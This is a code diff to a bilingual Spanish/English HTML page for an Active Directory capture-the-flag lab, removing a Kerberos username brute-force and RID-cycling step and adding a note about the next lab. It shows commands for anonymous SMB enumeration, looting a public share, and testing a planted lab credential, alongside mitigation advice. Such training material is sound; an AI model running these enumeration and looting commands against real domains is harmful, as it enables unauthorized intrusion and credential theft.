@@ -45,21 +45,7 @@ smbclient -N -L //{{ ad_dc_ip }}/
 smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
     <p>Entre los recursos aparece <code>public</code> con permiso de lectura para todos.</p>
 
-    <h3>3 · Enumerar usuarios del dominio sin credenciales</h3>
-    <p>La vía verificada y funcional contra este Domain Controller es la fuerza bruta de nombres directamente contra el KDC de Kerberos: para cada nombre probado, el KDC responde distinto según exista o no esa cuenta (<code>PRINCIPAL UNKNOWN</code> vs. petición de pre-auth), y esto no requiere ninguna sesión SMB previa.</p>
-    <pre># Enumeración de usuarios contra Kerberos (no necesita sesión SMB ni credenciales)
-kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt</pre>
-    <p>Guarda la lista de usuarios válidos en <code>users.txt</code>: la vas a reutilizar en los labs de spraying, AS-REP Roasting y Kerberoasting.</p>
-    <pre>kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 2>/dev/null \
-  | grep 'VALID USERNAME' | awk '{print $NF}' | cut -d@ -f1 &gt; users.txt
-cat users.txt</pre>
-
-    <p><strong>Nota sobre este Domain Controller:</strong> el RID cycling clásico por SMB/SAMR-LSAD (<code>nxc --rid-brute</code>, <code>impacket-lookupsid</code>) es la técnica que usarías contra un Domain Controller Windows real, pero <strong>no funciona contra este DC</strong>: la cuenta <code>guest</code> no admite login explícito (<code>STATUS_LOGON_FAILURE</code>) y, aunque uses una sesión completamente anónima, el propio LSAD rechaza la petición (<code>STATUS_ACCESS_DENIED</code>) — limitación conocida de la implementación de Samba. Los comandos reales, para referencia:</p>
-    <pre># Contra un DC Windows real esto SÍ funciona con sesión nula o guest:
-nxc smb {{ ad_dc_ip }} -u '' -p '' --rid-brute
-impacket-lookupsid '{{ ad_domain }}/:@{{ ad_dc_ip }}' 1500</pre>
-
-    <h3>4 · Saquear el recurso anónimo</h3>
+    <h3>3 · Saquear el recurso anónimo</h3>
     <pre>smbclient -N //{{ ad_dc_ip }}/public
 smb: \&gt; ls
 smb: \&gt; get flag-ad-01.txt
@@ -72,7 +58,7 @@ cat IT_Onboarding.txt   # ← credenciales de svc.readonly</pre>
     <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt -' 2&gt;/dev/null
 nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
 
-    <h3>5 · Capturar la flag</h3>
+    <h3>4 · Capturar la flag</h3>
     <p>La flag está en <code>flag-ad-01.txt</code> del recurso <code>public</code>:</p>
     <pre>HL{···}</pre>
     <p>Y <code>IT_Onboarding.txt</code> te entrega el <em>foothold</em> con el que arrancan el resto de laboratorios de esta categoría:</p>
@@ -81,6 +67,7 @@ Password: ReadOnly123!
 
 # Verifícalo:
 nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
+    <p>Esa credencial es la que usarás en el siguiente laboratorio (AD 02) para enumerar los usuarios del dominio — la enumeración anónima de usuarios (RID cycling con sesión nula o <code>guest</code>) no funciona contra este Domain Controller.</p>
 
     <h3>Mitigación</h3>
     <ul>
@@ -90,7 +77,7 @@ nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
     </ul>
 
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">impacket-lookupsid</span> <span class="tools-badge">kerbrute</span> <span class="tools-badge">enum4linux-ng</span></div>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">enum4linux-ng</span></div>
   </div>
 
   <div class="lang-content" data-lang="en" style="display:none">
@@ -114,21 +101,7 @@ smbclient -N -L //{{ ad_dc_ip }}/
 smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
     <p>A <code>public</code> share shows up, readable by everyone.</p>
 
-    <h3>3 · Enumerate domain users without credentials</h3>
-    <p>The verified path that actually works against this Domain Controller is username brute force directly against the Kerberos KDC: for each candidate name, the KDC replies differently depending on whether the account exists (<code>PRINCIPAL UNKNOWN</code> vs. a pre-auth prompt), and this needs no prior SMB session at all.</p>
-    <pre># Kerberos user enumeration (no SMB session or credentials needed)
-kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt</pre>
-    <p>Save the valid usernames to <code>users.txt</code>: you will reuse it in the spraying, AS-REP Roasting and Kerberoasting labs.</p>
-    <pre>kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 2>/dev/null \
-  | grep 'VALID USERNAME' | awk '{print $NF}' | cut -d@ -f1 &gt; users.txt
-cat users.txt</pre>
-
-    <p><strong>Note about this Domain Controller:</strong> classic SMB/SAMR-LSAD RID cycling (<code>nxc --rid-brute</code>, <code>impacket-lookupsid</code>) is the technique you'd use against a real Windows Domain Controller, but <strong>it does not work against this DC</strong>: the <code>guest</code> account rejects explicit login (<code>STATUS_LOGON_FAILURE</code>), and even with a fully anonymous session LSAD itself denies the request (<code>STATUS_ACCESS_DENIED</code>) — a known limitation of Samba's implementation. The real commands, for reference:</p>
-    <pre># Against a real Windows DC this DOES work with a null or guest session:
-nxc smb {{ ad_dc_ip }} -u '' -p '' --rid-brute
-impacket-lookupsid '{{ ad_domain }}/:@{{ ad_dc_ip }}' 1500</pre>
-
-    <h3>4 · Loot the anonymous share</h3>
+    <h3>3 · Loot the anonymous share</h3>
     <pre>smbclient -N //{{ ad_dc_ip }}/public
 smb: \&gt; ls
 smb: \&gt; get flag-ad-01.txt
@@ -141,7 +114,7 @@ cat IT_Onboarding.txt   # ← svc.readonly credentials</pre>
     <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt -' 2&gt;/dev/null
 nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
 
-    <h3>5 · Capture the flag</h3>
+    <h3>4 · Capture the flag</h3>
     <p>The flag lives in <code>flag-ad-01.txt</code> inside the <code>public</code> share:</p>
     <pre>HL{···}</pre>
     <p>And <code>IT_Onboarding.txt</code> hands you the foothold every other lab in this category starts from:</p>
@@ -150,6 +123,7 @@ Password: ReadOnly123!
 
 # Verify it:
 nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
+    <p>That credential is what you'll use in the next lab (AD 02) to enumerate domain users — anonymous user enumeration (RID cycling with a null or <code>guest</code> session) does not work against this Domain Controller.</p>
 
     <h3>Mitigation</h3>
     <ul>
@@ -159,7 +133,7 @@ nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
     </ul>
 
     <h3>Tools</h3>
-    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">impacket-lookupsid</span> <span class="tools-badge">kerbrute</span> <span class="tools-badge">enum4linux-ng</span></div>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">enum4linux-ng</span></div>
   </div>
 </div>
 {% endblock %}
